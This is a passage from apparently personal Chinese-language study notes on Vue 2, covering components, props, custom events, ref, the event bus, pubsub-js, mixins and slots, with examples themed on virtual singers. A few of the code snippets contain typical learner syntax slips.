        <button @click="showNameColor">{{color}}</button>
    </div>
    `,
    data() {
        return {
            name: '洛天依',
            color: 'blue'
        }
    },
    methods: {
        showNameColor() {
            alert(this.name + '-' + this.color)
        }
    },
})
```

##### 定义子组件sing

```javascript
const sing = Vue.extend({
    template: `
    <div>
        <h2>唱首歌</h2>
        <button @click="singASong">{{song}}</button>
    </div>
    `,
    data() {
        return {
            song: '霜雪千年'
        }
    },
    methods: {
        singASong() {
            alert('唱首歌给你听：' + this.song)
        }
    },
})
```

------

#### 2. 注册组件

局部组件注册

```javascript
// 测试全局组件和局部注册组件
new Vue({
    el: '#root',
    data: {
        msg: '你好啊！'
    },
    // 注册组件（局部注册）
    components: {
        vsinger1: yzl,
        vsinger2: lty,
    }
})
```

全局组件注册

```javascript
 // 全局注册组件
Vue.component('sing', sing)

new Vue({
    // 测试全局组件
	el: '#root2',
})
```



------

#### 3. 组件标签

```html
<div id="root">
    <!-- 3. 局部组件标签 -->
    <vsinger1></vsinger1>
    <hr>
    <vSinger2></vSinger2>
    <hr>
    <sing></sing>
</div>
<hr>
<div id="root2">
    <!-- 3. 测试全局组件标签 -->
    <sing></sing>
</div>
```

### 注册组件问题

1. 注册组件标签问题 
2. vue开发者工具的组件提示name设置
3. 组件标签——单标签</xxx>（脚手架环境）
4. 简写：const yzl = Vue.extend({}) 为：const yzl = {}【options】（注册组件时会判断）

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <hr>
    <yzl></yzl>
    <vsinger></vsinger>
    <vsinger-yzl></vsinger-yzl>
    <!-- 脚手架用 -->
    <!-- <VsingerYzl></VsingerYzl> -->
</div>

<script type="text/javascript">
    Vue.config.productionTip = false 
    const yzl = Vue.extend({
        // 开发者工具的提示名，应该回避html中已有文件名，用英文开头。
        name: 'v乐正绫',  
        template: `
          <div>
              <h2>{{name}}</h2>
              <button @click="showNameColor">{{color}}</button>
          </div>
          `,
        data() {
            return {
                name: '乐正绫',
                color: 'red'
            }
        },
        methods: {
            showNameColor() {
                alert(this.name + '-' + this.color)
            }
        },
    })

    new Vue({
        el: '#root',
        data: {
            name: 'YZling'
        },
        components: {
            // 简写
            yzl,
            // 单个词
            vsinger: yzl,
            // 多个词
            'vsinger-yzl': yzl,
            // VsingerYzl: yzl // 报错
        }
    })
</script>
```

------

### 组件的嵌套

1. yzl组件里面嵌套vsinger组件。

2. 创建一个和yzl组件的平级hello组件。

   注意事项：**子组件 vsinger 的定义必须在父组件 yzl 前面**。

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <hr>
    <yzl></yzl>
    <hello></hello>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    // 定义嵌套vsinger组件
    const vsinger = {
        name: 'vsinger',
        template: `
          <div>
              <h2>{{name}}</h2>
              <button>{{color}}</button>
              
          </div>
          `,
        data() {
            return {
                name: 'singer',
                color: 'null'
            }
        }
    }
    // 定义yzl组件
    const yzl = {
        name: 'v乐正绫',
        template: `
          <div>
              <h2>{{name}}</h2>
              <button @click="showNameColor">{{color}}</button>
              <vsinger></vsinger>
          </div>
          `,
        data() {
            return {
                name: '乐正绫',
                color: 'red'
            }
        },
        methods: {
            showNameColor() {
                alert(this.name + '-' + this.color)
            }
        },
        components: {
            // vsinger的定义必须在yzl组件前
            vsinger
        }
    }
    // 平级hello组件
    const hello = {
        template: `
          <div>
              <h2>{{hello}}</h2>
          </div>
          `,
        data() {
            return {
                hello: 'hello world!!!'
            }
        }
    }
    // 
    new Vue({
        el: '#root',
        data: {
            name: 'YZling'
        },
        components: {
            // 简写
            yzl,
            hello
        }
    })
</script>
```

------

### 关于VueComponent（子组件）

1. yzl组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
2. 我们只需要写<yzl/>或<yzl></yzl>，Vue解析时会帮我们创建yzl组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
3. 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent！！！！
4. **关于this指向**：
	(1). 组件配置中：
		data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【VueComponent实例对象】。
(2). new Vue(options)配置中：
		data函数、methods中的函数、watch中的函数、computed中的函数 它们的this均是【Vue实例对象】。
5. VueComponent的实例对象，以后简称vc（也可称之为：组件实例对象）。
6. Vue的实例对象，简称vm。(**vc和vm区别**：el配置，data的实现方式：方法、对象)。

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <hr>
    <yzl></yzl>
    <hello></hello>
</div>

<script type="text/javascript">
    Vue.config.productionTip = false // 阻止vue启动生产提示
    // 定义yzl组件
    const yzl = {
        name: 'v乐正绫',
        template: `
          <div>
              <h2>{{name}}</h2>
              <h2>{{color}}</h2>
          </div>
          `,
        data() {
            return {
                name: '乐正绫',
                color: 'red'
            }
        }
    }
    // hello组件
    const hello = {
        template: `
          <div>
              <h2>{{hello}}</h2>
          </div>
          `,
        data() {
            return {
                hello: 'hello world!!!'
            }
        }
    }
    // root
    const vm = new Vue({
        el: '#root',
        data: {
            name: 'YZling'
        },
        components: { yzl, hello }
    })
    // 判断组件本质是一个名为VueComponent的构造函数，他们不一样
    console.log('@' + yzl) 
    console.log('@' + hello)
    console.log(yzl == vm) // false
    yzl.a = 99;
    console.log(yzl.a)
    console.log(vm.a) // undefined
</script>
```

### 一个重要内置关系

1. 一个重要的内置关系：VueComponent.prototype.__proto__ === Vue.prototype
2. 为什么要有这个关系：让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

```html
<div id="root">
    <h1>你好，{{name}}</h1>
    <yzl></yzl>
</div>
<script type="text/javascript">
    Vue.config.productionTip = false 
    // 定义yzl组件
    const yzl = Vue.extend({
        name: 'v乐正绫',
        template: `
                  <div>
                      <h2>{{name}}</h2>
                      <h2>{{color}}</h2>
                  </div>
                  `,
        data() {
            return {
                name: '乐正绫',
                color: 'red'
            }
        }
    })
    // hello组件
    const hello = {
        template: `
                  <div>
                      <h2>{{hello}}</h2>
                  </div>
                  `,
        data() {
            return {
                hello: 'hello world!!!'
            }
        }
    }
    // root
    const vm = new Vue({
        el: '#root',
        data: {
            name: 'YZling'
        },root
        components: { yzl, hello }
    })
    // 定义hello组件不能简写
    // console.log(hello.prototype.__proto__ === Vue.prototype)
    console.log(yzl.prototype.__proto__ === Vue.prototype)
</script>
```



------

## 	单文件组件

一些简单的单文件组件

#### // index.html

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>初实单文件组件</title>
</head>

<body>
    <div id="root">

    </div>
    <script type="text/javascript" src="../js/vue.js"></script>
    <script type="text/javascript" src="./main.js"></script>
</body>

</html>
```

#### // main.js

```javascript
import App from './App.vue'

new Vue({
    el: '#root',
    template: `<App></App>`,
    components: {
        App
    },
})
```

#### // App.vue

```html
<template>
  <div>
    <VSinger></VSinger>
    <YZLing></YZLing>
  </div>
</template>

<script>
// 引入组件
import VSinger from "./VSinger";
import YZLing from "./YZLing.vue";

export default {
  name: "App",
  components: {
    VSinger,
    YZLing,
  },
};
</script>

<style>
</style>
```

#### // VSinger.vue

```html
<template>
  <div class="demo">
    <h2>{{ name }}</h2>
    <button @click="showNameColor">{{ color }}</button>
  </div>
</template>

<script>
// 暴露组件(默认方式)
export default Vue.extend({
  data() {
    name: "VSinger";
    return {
      name: "名称",
      color: "代表色",
    };
  },
  methods: {
    showNameColor() {
      alert(this.name + "-" + this.color);
    },
  },
});
</script>

<style>
.demo {
  background-color: #0ee;
}
</style>
```

#### // YZLinh.vue

```html
<template>
  <div class="demo">
    <h2>{{ name }}</h2>
    <button @click="showNameColor">{{ color }}</button>
  </div>
</template>

<script>
// 暴露组件简写
export default {
  name: "YZLing",
  data() {
    return {
      name: "乐正绫",
      color: "红色",
    };
  },
  methods: {
    showNameColor() {
      alert(this.name + "-" + this.color);
    },
  },
};
</script>

<style>
.demo {
  background-color: #0ee;
}
</style>
```

------

# vue-cli

## 脚手架创建步骤



Vue版本2.x  匹配   脚手架版本4.x ( command line interface )

1. 淘宝镜像：npm config set registry https://registry.npm.taobao.org
2. 全局安装：npm install -g @vue/cli
3. 创建目录： vue create xxx （vue-cli创建）
4. npm run serve

vite：npm create vue@legacy //如果你需要支持 IE11，你可以创建一个 Vue 2 项目

卸载：npm remove -g @vue/cli  
检查vue版本（ 8.19.3） vue --version
node -v   版本v18.13.0
cd Desktop
cd C:\Users\ASUS\Desktop
vue-cli版本（vue -V）

## 目录结构

```markdown
my-project/
├── node_modules/      # 依赖库目录
├── public/            # 静态资源目录
|—— ├── favicon.ico: 页签图标
│   ├── index.html     # 入口 HTML 文件
│   └── ...
├── src/               # 项目源码目录
│   ├── assets/        # 静态资源目录
|   |   └── logo.png 
│   ├── components/    # 组件目录
│   │   └── XxxXxx.vue
│   ├── router/        # 路由目录
│   ├── store/         # 状态管理目录
│   ├── views/         # 页面目录
│   ├── App.vue        # 根组件
│   └── main.js        # 入口 JS 文件
├── .gitignore         # Git 忽略文件列表
├── babel.config.js    # Babel 配置文件
├── package.json       # 项目配置文件(应用包配置文件)
├── package-lock.json  # 依赖版本锁定文件(包版本控制文件)
└── README.md          # 项目说明文件

```

# 组件的注册

```javascript
// 1. 引入组件
import Component from './components/component.vue'

// 2. 注册组件
components:{ Component }  // 组件中注册
app.component( Component.name, Component ) // main.js下注册，Component.name前提组件设置name属性
```

# 组件间通信



------

## props

***App.vue使用  v-bind  传值给YZLing.vue***

### 父传子

#### App.vue

```html
<template>
  <div>
    <!-- 1. 简单接收默认类型都是String,  :hot 才能是数字类型-->
    <!-- <YZLing name="乐正绫" color="#EE0000" :hot="412" /> -->
    <!-- 2. 对象接收。可以设置接收类型 -->
    <YZLing name="乐正绫" color="#EE0000" :hot="412" />
  </div>
</template>

<script>
import YZLing from "./components/YZLing.vue";

export default {
  name: "App",
  components: {
    YZLing,
  },
};
</script>

<style>
</style>
```

#### YZLing.vue

```html
<template>
  <div class="demo">
    <h1>{{ msg }}</h1>
    <h2>代表色：{{ color }}</h2>
    <h2>姓名：{{ name }}</h2>
    <h2>热度：{{ myHot }}</h2>
    <button @click="changeColor">ChangeColor</button>
  </div>
</template>

<script>
// 暴露组件简写
export default {
  name: "YZLing",
  data() {
    console.log(this);
    return {
      msg: "禾念旗下：虚拟歌姬",
      myHot: this.hot,
      // name: "乐正绫",
      // color: "#EE0000",
      // hot: 412,
    };
  },
  methods: {
    changeColor() {
      console.log(this);
      // this.hot++
      this.myHot++;
    },
  },
  /**
   * 1. key 不能传，是虚拟DOM的唯一标识，已被征用
   * 2. ref 也一样
   */
  // 1. 简单（只）接收
  props: ["name", "color", "hot"], // :hot 才能是数字类型，不然默认字符串类型

  // 2. 限制类型
  /* props: {
    name: String,
    color: String,
    hot: Number,
  },  */

  // 3. 完完整整写法 限制：类型、必要性(必传值)、默认值
  // 必要性(必传值)和默认值一般不一起写，逻辑重复
  /* props: {
    name: {
      type: String,
      required: true,
    },
    color: {
      type: String,
      default: "红色",
    },
    hot: {
      type: Number,
      required: true,
    },
  }, */
};
</script>

<style>
.demo {
  background-color: #e99;
}
</style>
```

### 子传父

实现：点击VSinger.vue里面的button发送信息，App.vue得到信息

1. 父组件传递一个函数。 <VSinger :atVSinger="getVSingerMsg" />
2. 子组件声明接收。 props: ["atVSinger"]
3. 子组件点击按钮触发这个函数。

#### App.vue

```html
<template>
  <div class="h">
    <h1>Hello ! {{ vsingerName }}</h1>
    <!-- 1. 通过父组件给子组件传递函数类型props实现：子给父传递数据，  -->
    <VSinger :atVSinger="getVSingerMsg" />
  </div>
</template>

<script>
import YZLing from "./components/YZLing.vue";
import VSinger from "./components/VSinger.vue";

export default {
  name: "App",
  data() {
    return {
      vsingerName: "",
    };
  },
  components: {
    VSinger,
  },
  methods: {
    getVSingerMsg(msg) {
      console.log("app收到了Vsinger信息:" + msg);
        this.vsingerName = msg;
    }
  }
}
</script>

<style lang="less">
.title {
  color: white;
  .qwe {
    font-size: 40px;
  }
}
.h {
  padding: 10px;
  background-color: #ddd;
}
</style>
```

#### VSinger.vue

```html
<template>
  <div class="demo">
    <h1 class="title">{{ companyName }}</h1>
    <h2>{{ msg }}</h2>
    <button @click="sendVSingerInfo">把vsinger信息给app</button>
  </div>
</template>

<script>
export default {
  name: "VSinger",
  props: ["atVSinger"],
  data() {
    return {
      companyName: "上海禾念信息科技有限公司",
      msg: "虚拟歌姬",
      singer: "洛天依、言和、乐正绫、乐正龙牙、徵羽摩柯、墨清弦",
    };
  },
  methods: {
    sendVSingerInfo() {
      this.atVSinger(this.msg);
    }
  }
};
</script>


<style scoped>
.demo {
  background-color: #0ee;
}
</style>
```

------

## 自定义事件

实现：点击子组件按钮发送信息给父组件，并显示。（适用于子组件传递给父组件）
***App.vue使用   v-on 传值给YZLing.vue***

### 子传父

1. 父组件App.vue用v-on 绑定自定义事件 atYZling 并设置函数getYZLingInfo。

   ```html
   <YZLing v-on:atYZling="getYZLingInfo" />
   ```

2. 子组件YZLing.vue绑定点击事件并设计函数 sendYZLingName。

   ```html
   <button @click="sendYZLingName">把yz姓名给app</button>
   ```

3. 子组件YZLing.vue点击事件，调用的函数，触发App.vue自定义事件。 

   ```javascript
   this.$emit("atYZling", this.name, this.msg);
   ```

4. App.vue事件被触发，调用函数得到子组件信息。

   ```javascript
   methods: {
       getYZLingInfo(name, ...params) {
         console.log("app收到了YZLing姓名:" + name + params);
         this.vsingerName = name;
       },
     },
   ```


------

### App.vue

```html
<template>
  <div class="h">
    <h1>Hello ! {{ vsingerName }}</h1>
    <!-- 方法一. 通过父组件给子组件传递函数类型实现：子给父传递数据 props  -->
    <VSinger :atVSinger="getVSingerMsg" />
    <hr />
    <!-- 方法二. 父组件给子组件绑定一个自定义事件实现：子给父传递数据 @  -->
    <!-- <YZLing v-on:atLuoTianYi.once="getYZLingInfo" /> -->
    <LuoTianYi @atLuoTianYi="getLuoTianYiInfo" />
    <hr />
    <!-- 方法三. 父组件给子组件绑定自定义事件实现：子给父传递数据 ref -->
    <!-- 组件添加原生事件写法：@click.native -->
    <YZLing ref="yzling" @demo="m1" @click.native="show" />
  </div>
</template>

<script>
import YZLing from "./components/YZLing.vue";
import VSinger from "./components/VSinger.vue";
import LuoTianYi from "./components/LuoTianYi.vue";

export default {
  name: "App",
  data() {
    return {
      vsingerName: "",
    };
  },
  components: {
    YZLing,
    VSinger,
    LuoTianYi
  },
  mounted() {
    // 谁触发的atApp事件this就是谁，直接写回调函数this指向的不是app，箭头函数就是（没有this往外找）
    // 方法三、
    this.$refs.yzling.$on("atApp", this.getName);
  },
  methods: {
    // 方法一、回调回调得到VSinger数据
    getVSingerMsg(msg, singer) {
      console.log("app收到了VSinger信息:" + msg + singer);
    },
    // 方法二、回调得到YZling数据
    getLuoTianYiInfo(name, ...params) {
      console.log("app收到了LuoTianYi信息:" + name + params);
      this.vsingerName = name;
    },
    // 方法三、回调得到YZling名称
    getName(name) {
      console.log("子组件@App的名称:" + name );
    },
    // 方法三、测试自定义事件、原生DOM点击事件
    m1() {
      console.log("自定义事件m1被调用了");
    },
    show() {
      console.log("原生点击事件触发了");
    },
  },
};
</script>

<style lang="less">
.h {
  padding: 10px;
  background-color: #ddd;
}
</style>

```

### 方法一

子组件 VSinger.vue

```html
<template>
  <div class="demo">
    <h1 class="title">{{ companyName }}</h1>
    <button @click="sendVSingerInfo">把vsinger信息给app</button>
  </div>
</template>

<script>
export default {
  name: "VSinger",
  props: ["atVSinger"], // 方法一. 步骤：接收父组件转递的自定义事件
  data() {
    return {
      companyName: "上海禾念信息科技有限公司",
      msg: "虚拟歌姬",
      singer: "洛天依、言和、乐正绫、乐正龙牙、徵羽摩柯、墨清弦",
    };
  },
  methods: {
    sendVSingerInfo() {
      // 方法一. 步骤：调用父组件转递的自定义事件并传递参数
      this.atVSinger(this.msg,this.singer);
    },
  },
};
</script>

<style scoped>
/* 组件类名相同后引入显示颜色 */
/* scoped 局部样式 */
.demo {
  background-color: #0ee;
}
</style>
```

### 方法二

子组件 LuoTianYi.vue

```html
<template>
  <div class="demo">
    <h3>{{name}}</h3>
    <button @click="sendLuoTianYiName">把LuoTianYi信息给app</button>
  </div>
</template>

<script>
export default {
  name: "LuoTianYi",
  props: ["atLuoTianYi"], // 方法二、步骤：接收父组件转递的自定义事件
  data() {
    return {
      msg: "禾念旗下：虚拟歌姬",
      name: "洛天依",
      color: "#0000EE",
      hot: 111,
    };
  },
  methods: {
    // 方法二、点击子按钮触发父组件事件
    sendLuoTianYiName() {
      this.$emit("atLuoTianYi",  this.msg,this.name, this.color, this.hot);
    },
  },
};
</script>
<style scoped>
/* scoped 局部样式 */
.demo {
  background-color: #0ee;
}
</style>

```

### 方法三

子组件 YZLing.vue

```html
<template>
  <div class="demo">
    <h3>{{name}}</h3>
    <button @click="myselfAtApp">点名app</button>
    <button @click="otherTest">测试自定义事件、原生DOM点击事件</button>
    <button @click="unbind">解绑atApp</button>
  </div>
</template>

<script>
export default {
  name: "YZLing",
  // props: ["atApp", "demo"], // 方法三、不需要接受atApp
  props: ["demo"],
  data() {
    return {
      msg: "禾念旗下：虚拟歌姬",
      name: "乐正绫",
      color: "#EE0000",
      hot: 412,
    };
  },
  methods: {
    // 方法三、点击子按钮触发父组件事件
    myselfAtApp() {
      this.$emit("atApp", this.name);
    },
    // 方法三、测试自定义事件、原生DOM点击事件
    otherTest(){
      this.$emit("demo",)
    },
    unbind() {
      // 解绑自定义事件
      console.log("解绑事件：atApp")
      this.$off("atApp"); // 一个
      // this.$off(["atYZling", "demo"]); // 多个
      // this.$off(); // 所有
    },
  },
};
</script>

<style scoped>
/* scoped 局部样式 */
.demo {
  background-color: #e99;
}
</style>

```

------

## ref

1. 被用来给元素或子组件注册引用信息（id的替代者）相当于document.getElectmentById("#id")
2. 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc)

父组件通过this.$refs.yzling.$on（自导自演的感觉）

1. ref绑定组件标签。<YZLing ref="yzling" />
2. 得到这个组件的实例对象VC。 this.$refs.yzling
3. 父组件挂载时邦定事件，当事件atYZling被触发，调用回调函数。this.$refs.yzling.$on("atYZling", this.getYZLingInfo);
4. 子组件点击事件触发。this.$emit("atYZling", this.name, this.msg);

注意事项：

1. 相比于v-on：可以在挂载时使用定时器，避免直接绑定自定义事件。
2. **ref 相当于 id 。**
3. ref应用在html标签上获取的是真实DOM元素， 相当于document.getElectmentById("#id")**
4. ref应用在组件标签上是组件实例对象（vc)

### App.vue

```html
 <template>
  <div>
    <VSinger ref="vsinger" />
    <YZLing ref="yzling" ></YZLing>
    <h1 v-text="doHHH" ref="title"></h1>
    <button @click="smile" ref="btn">笑</button>
      
    <!-- v-on实现 -->
    <!-- <YZLing v-on:atYZling="getYZLingInfo" /> -->
    <!-- 父组件给子组件绑定自定义事件实现：子给父传递数据 ref实现 -->
    <!-- 组件添加原生事件写法：@click.native -->
  </div>
</template>

<script>
// 引入组件
import VSinger from "../src/components/VSinger.vue";
import YZLing from "../src/components/YZLing.vue";

export default {
  name: "App",
  data() {
    return { doHHH: "哈哈哈" };
  },
  mounted{
      // 分组写法：
      // 在mounted给子组件绑定一个事件，父组件自己就可以通过点击事件触发，获取子组件数据，但是子组件还要写this.$emit去触发这个事件
  	  this.$refs.yzling.$on("atYzling",this.getYZlingData) 
      // this.$refs.yzling.$once("atYZling", this.getYZLingInfo); // 一次性
   
      // 谁触发的atYZling事件this就是谁，直接写回调函数this指向的不是app，箭头函数就是（没有this往外找）
      /*
      // 聚合写法：
      this.$refs.yzling.$on("atYZling",function(name, ...params) {
        console.log("app收到了YZLing信息:" + name + params);
        this.vsingerName = name;
      });*/
  },
  components: { VSinger, YZLing },
  methods: {
    smile() {
        // 1. 单纯通过ref得到数据(DOM、data)
      console.log(this.$refs.btn); // 返回真实DOM，相当于document.getElectmentById("#id")
      console.log(this.$refs.title); // 返回真实DOM
      console.log(this.$refs.vsinger); // 组件实例对象
      alert(this.$refs.vsinger.name); // 返回子组件data数据（子传父）
    },
        // 2. 配合ref、$emit、$on、自定义事件得到数据
    getYZlingData(data){
      console.log(data) // 返回子组件data数据（子传父）
	}
  },
};
</script>
<style></style>
```

### YZLing.vue

```html
<template>
  <div class="demo">
    <h1>{{ msg }}</h1>
    <h2>代表色：{{ color }}</h2>
    <h2>姓名：{{ name }}</h2>
    <h2>热度：{{ hot }}</h2>
    <button @click="sendYZLingName">把yz姓名给app</button>
  </div>
</template>

<script>
export default {
  name: "YZLing",
  data() {
    return {
      msg: "禾念旗下：虚拟歌姬",
      name: "乐正绫",
      color: "#EE0000",
      hot: 412,
    };
  },
  methods: {
    sendYZLingName() {
      // 触发父组件app事件并传递参数
      this.$emit("atYZling", this.name, this.msg);
    }
  },
}
</script>

<style scoped>
.demo {
  background-color: #e99;
}
</style>
```







## 		全局事件总线

### 使用步骤：

1. 安装全局事件总线。

   xxxx.js

   ```javascript
   new Vue({
      	......
      	beforeCreate() {
      		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
      	},
          ......
      }) 
   ```

2. 使用事件总线。

   则在A组件中给$bus绑定自定义事件 xxxx ，事件的回调留在A组件自身。

   ```javascript
    methods(){
           demo(data){......}
         }
         ......
         mounted() {
           this.$bus.$on('xxxx',this.demo)
         }
    }
   ```

3. B组件触发 xxxx 事件，传递信息。

   ```javascript
   methods: {
       sendYZLingHot() {
         this.$bus.$emit("xxxx", this.hot);
       },
   },
   ```

4. 解绑最好在绑定事件的A组件，beforeDestroy钩子中，用$off去解绑当前组件所用到的事件。

   ```javascript
   beforeDestroy() {
       // 销毁 减轻$bus
       this.$bus.$off("hello");
   },
   ```

### 子传子

实现 YZLing.vue 的 data(hot) 传递给 VSinger.vue

#### VSinger.vue

```html
<template>
  <div class="demo">
    <h1 class="title">{{ companyName }}</h1>
    <h2>{{ msg }}</h2>
    <h2>{{ singer }}</h2>
  </div>
</template>

<script>
export default {
  name: "VSinger",
  data() {
    return {
      companyName: "上海禾念信息科技有限公司",
      msg: "虚拟歌姬",
      singer: "洛天依、言和、乐正绫、乐正龙牙、徵羽摩柯、墨清弦",
    };
  },
  mounted() {
    this.$bus.$on("hello", (data) => {
      console.log("收到了热度", data);
    });
  },
  beforeDestroy() {
    // 销毁 减轻$bus
    this.$bus.$off("hello");
  },
};
</script>


<style scoped>
/* 组件类名相同后引入显示颜色 */
/* scoped 局部样式 */
.demo {
  background-color: #0ee;
}
</style>
```

YZLing.vue

```html
<template>
  <div class="demo">
    <h1>{{ msg }}</h1>
    <h2>代表色：{{ color }}</h2>
    <h2>姓名：{{ name }}</h2>
    <h2>热度：{{ hot }}</h2>
    <button @click="sendYZLingHot">将YZling的热度传给Vsinger</button>
  </div>
</template>

<script>
export default {
  name: "YZLing",
  data() {
    return {
      msg: "禾念旗下：虚拟歌姬",
      name: "乐正绫",
      color: "#EE0000",
      hot: 412,
    };
  },
  methods: {
    sendYZLingHot() {
      this.$bus.$emit("hello", this.hot);
    },
  },
};
</script>

<style scoped>
.demo {
  background-color: #e99;
}
</style>
```



------

## 		消息的订阅与发布

### 使用步骤

1. 安装pubsub-js库：npm i pubsub-js
2. 使用的组件导入库。
3. A组件订阅消息。
4. B组件发布消息。
5. A组件取消订阅消息

### 任意组件通信

VSinger订阅 ，YZLing发布的hot消息

#### VSinger.vue

```html
<template>
  <div class="demo">
    <h1 class="title">{{ companyName }}</h1>
    <h2>{{ msg }}</h2>
    <h2>{{ singer }}</h2>
  </div>
</template>

<script>
import pubsub from "pubsub-js";
export default {
  name: "VSinger",
  data() {
    return {
      companyName: "上海禾念信息科技有限公司",
      msg: "虚拟歌姬",
      singer: "洛天依、言和、乐正绫、乐正龙牙、徵羽摩柯、墨清弦",
    };
  },
  methods: {
    // 订阅回调函数
    demo(msgName, data) {
      console.log("接收到了YZLing的热度", msgName, data);
    },
  },
  mounted() {
    // 3. 订阅
    // 用箭头函数或者写到nethods里面this才指向vc
    this.pubId = pubsub.subscribe("hello", this.demo);
  },
  beforeDestroy() {
    // 取消订阅
    pubsub.unsubscribe(this.pubId);
  },
};
</script>

<style scoped>
/* 组件类名相同后引入显示颜色 */
/* scoped 局部样式 */
.demo {
  background-color: #0ee;
}
</style>
```

#### YZLing.vue

```html
<template>
  <div class="demo">
    <h1>{{ msg }}</h1>
    <h2>代表色：{{ color }}</h2>
    <h2>姓名：{{ name }}</h2>
    <h2>热度：{{ hot }}</h2>
    <button @click="sendYZLingHot">将YZling的热度传给Vsinger</button>
  </div>
</template>

<script>
// 1. 导入库
import pubsub from "pubsub-js";
export default {
  name: "YZLing",
  props: ["atYZling", "demo"],
  data() {
    return {
      msg: "禾念旗下：虚拟歌姬",
      name: "乐正绫",
      color: "#EE0000",
      hot: 412,
    };
  },
  methods: {
    sendYZLingHot() {
      // 2. 发布
      pubsub.publish("hello", this.hot);
    },
  },
};
</script>

<style scoped>
/* scoped 局部样式 */
.demo {
  background-color: #e99;
}
</style>
```



------

## 注意事项

1. 组件标签绑定原生事件要加修饰符：<YZLing ref="yzling" @demo="m1" @click.native="show" />

# mixin（混入）

混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。

## myMixin.js

 **定义mixin**，它就是一个对象，这个对象里面可以包含Vue组件中的一些常见配置，如data、methods、created等等。

```javascript
export const  {
    data:{
        return {}
    },
    computed:{},
    created:{},
    methods: {
        showNameColor() {
            alert(this.name + "-" + this.color);
        }
    },
    mounted() {
        console.log('hh')
    }
}

/**
 * 发生冲突
 * 1. data数据就近原则
 * 2. 生命周期钩子 都会执行 混合执行在前 
 */ 
```

### 局部混入

子组件YZLing.vue局部混入：1.引入混合。2.配置mixins属性 

```html
<template>
  <div class="demo">
    <h1>{{ msg }}</h1>
    <h2>代表色：{{ color }}</h2>
    <h2>姓名：{{ name }}</h2>
    <h2>热度：{{ hot }}</h2>
    <button @click="showNameColor">{{ color }}</button>
  </div>
</template>

<script>
// 局部引入混合
import { mixin } from "../myMixin";

export default {
  name: "YZLing",
  data() {
    return {
      msg: "禾念旗下：虚拟歌姬",
      name: "乐正绫",
      color: "#EE0000",
      hot: 412,
    };
  },
  // 局部mixins属性
  mixins: [mixin],
  methods: {
  	showNameColor() {
    	alert(this.name + "-" + this.color);
  	},
  },
};
</script>

<style>
.demo {
  background-color: #e99;
}
</style>
```

### 全局混入

程序入口文件main.js配置

```javascript
// 全局混合
import { mixin } from "./myMixin";
Vue.mixin(mixin);
```

组件引入

```javascript
data(){return{}},
mixins: ['mixin'], // 全局混入配置mixins属性
......
```



------

## 混入特点

1. 每个组件修改的data数据都不会互相影响，不**同组件中的mixin是相互独立的！**
2. 先执行mixin中生命周期函数中的代码，然后在执行组件内部的代码。（**生命周期函数**）
3. 当mixin中的data数据与组件中的data数据冲突时，组件中的data数据会覆盖mixin中数据。（**data数据冲突**）
4. mixin中与组件中方法名称相同，优先调用组件中的方法。（**方法冲突**）

| 优点                             | 缺点                         |
| -------------------------------- | ---------------------------- |
| 提高代码复用性                   | 命名冲突                     |
| 无需传递状态                     | 滥用的话后期很难维护         |
| 维护方便，只需要修改一个地方即可 | 不好追溯源，排查问题稍显麻烦 |
|                                  | 不能轻易的重复代码           |

------

# Slot-插槽

------

**实现业务**：展示三个列表（美食，游戏，电影），那个充钱了，展示大图，不用列表形式展示。

简写：#

## 不使用插槽

**实现方法**：修改Category.vue，将li标签插入一个src标签展示。
**实现问题**：因为三个列表都共用子组件，所以修改子组件三个都会展示图片。
**解决方法**：
（1）多个分类麻烦。

```html
<ul v-show = "title !== '美食'">
	<li v-for="(item, index) in listDate" :key="index">{{ item }}</li>
</ul>
<img v-show="title == '美食'" src="......xxx.jpg" style="width:100%">

```

（2）修改组件标签体（即运用插槽）

```html
<Category :listDate="foods" title="美食" >
    <!-- 这里html标签无法解析 -->
    <img v-show="title == '美食'" src="......xxx.jpg" style="width:100%">
</Category>
```

### Category.vue

```html
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <ul>
            <li v-for="(item, index) in listDate" :key="index">{{ item }}</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'Category',
    props: ['listDate', 'title']
}
</script>

<style scoped>
.category {
    background-color: skyblue;
    width: 200px;
    height: 300px;
}
h3 {
    text-align: center;
    background-color: orange;
}
video {
    width: 100%;
}
img {
    width: 100%;
}
</style>
```

### App.vue

```html
<template>
  <div class="container">
    <Category :listDate="foods" title="美食" />
    <Category :listDate="games" title="游戏" />
    <Category :listDate="films" title="电影" />
  </div>
</template>

<script>
import Category from './components/Category.vue'

export default {
  name: 'App',
  components: { Category },
  data() {
    return {
      foods: ['卤蛋', '荷包蛋', '水煮蛋', '茶叶蛋'],
      games: ['我的世界', '饥荒', '泰拉瑞亚', '神庙逃亡'],
      films: ['《穿靴子的猫》', '《后天》', '《Hello World》', '《2012》']
    }
  }
}
</script>

<style scoped>
.container {
  display: flex;
  justify-content: space-around;
}
</style>
```



------

## 默认插槽

### Category.vue（挖坑）

```html
<template>
    <div class="category">
        <h3>{{ title }}分类</h3>
        <slot>我是一些默认值，当使用者没有传递具体结构时，我会显示在浏览器上</slot>
    </div>
</template>

<script>
export default {
    name: 'Category',
    //props: ['listDate', 'title']
    props: ['title']
}
</script>

<style scoped>
.category {
    background-color: skyblue;
    width: 200px;
    height: 300px;
}
h3 {
    text-align: center;
    background-color: orange;
}
video {
    width: 100%;}
img {width: 100%;}
</style>
```

### App.vue（填坑）

```html
<template>
  <div class="container">
      <Category  title="美食" >
